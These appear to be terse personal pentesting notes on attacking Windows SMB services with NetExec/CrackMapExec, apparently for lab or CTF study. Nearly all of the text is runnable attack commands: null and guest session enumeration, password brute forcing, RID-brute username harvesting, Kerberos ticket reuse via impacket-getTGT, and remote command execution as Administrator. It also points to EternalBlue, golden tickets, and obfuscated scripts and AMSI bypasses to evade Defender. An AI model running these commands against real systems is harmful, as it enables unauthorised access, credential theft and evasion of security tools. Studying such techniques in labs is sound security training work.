
if smb v1 - try eternal blue


nullsessions
`nxc smb 10.10.10.10`
`nxc smb 10.10.10.10 -u '' -p ''`

`nxc smb 10.10.10.10 -u 'guest' -p ''`
`nxc smb 10.10.11.222 -u 'guest' -p '' --shares`

brute force password
`nxc smb 10.10.10.10 -u 'sofia' -p 'password-file'`

enum usernames
`nxc smb 10.10.10.10 -u 'sofia' -p 'mypass1' --rid-brute`
(rid is the end of the sid)

The same but using Kerberos - Kerberos traffic is more common on the network (the default is NTLM)
`cme smb 10.10.10.10 -u 'sofia' -p 'mypass1'`
`cme smb 10.10.10.10 -u 'sofia' -p 'mypass1' -k`

--use-kcache uses existing Kerberos ticket
`cme smb 10.10.10.10 -u 'sofia' -p 'mypass1' --use-kcache`
get ticket by
`impacket-getTGT -dc-ip 10.10.10.10 domain.LOCAL/usename`
`export KRB5CCNAME= user.ccache`
mostly useful for golden.. tickets
`cme smb 10.10.10.10 -u 'Administrator' -p 'securepass2'`

Execute commands
-x uses cmd
-X uses ps
`cme smb 10.10.10.10 -u 'Administrator' -p 'securepass2' -x 'whoami'`
`cme smb 10.10.10.10 -u 'Administrator' -p 'securepass2' -X 'whoami'`

.cme/obfuscated_scripts
can make your own since fingerprinted - defender finds
custom amsi bypass on cme webbpage

or run ps with cmd lol
`cme smb 10.10.10.10 -u 'Administrator' -p 'securepass2' -x 'powershell.exe -c "GCI C:\"'`

continue from [[Al's stream on crackmapexec]]

check [[audrey]]
check [[../../TO SORT/win  hacking al]]

-M spider_plus
from kristiee